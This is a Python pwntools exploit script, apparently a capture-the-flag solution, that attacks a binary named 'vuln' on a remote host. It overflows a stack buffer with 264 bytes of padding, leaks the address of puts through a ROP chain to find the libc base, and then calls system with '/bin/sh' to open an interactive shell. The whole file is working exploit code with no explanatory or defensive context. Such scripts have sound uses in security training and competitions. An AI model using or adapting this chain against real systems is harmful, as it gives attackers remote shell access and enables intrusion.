from pwn import *


elf = ELF('./vuln')

p = remote("35.188.73.186",1111)
#p = process('./vuln')
puts_plt = elf.symbols['puts']
main = elf.symbols['main']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000401223
payload = ""
payload += "A"*264

payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)


p.sendline(payload)
p.recvline()
p.recvline()
data = p.recvline()

puts_libc = u64(data[:6:].ljust(8,'\x00'))
libc_base = puts_libc - 0x0809c0
system_libc = libc_base + 0x04f440
bin_sh_libc = libc_base + 0x1b3e9a
print "puts_libc : ",hex(puts_libc)
print "libc_base : ",hex(libc_base)

payload = ""
payload += "A"*264

payload += p64(pop_rdi)
payload += p64(bin_sh_libc)
payload += p64(0x0000000000401221)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(system_libc)
p.sendline(payload)
p.interactive()
